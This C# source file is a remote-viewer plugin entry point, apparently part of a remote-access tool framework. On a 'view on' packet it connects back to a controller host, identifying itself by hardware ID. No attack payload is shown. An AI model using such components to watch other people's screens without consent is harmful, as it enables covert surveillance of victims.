using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;

        internal static RemoteViewerPacket remoteViewerBasePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.RM_VIEW_ON:
                    remoteViewerBasePacket = (RemoteViewerPacket)loadingAPI.CurrentPacket;
                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                    clientHandler.ConnectStart();
                    break;
                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
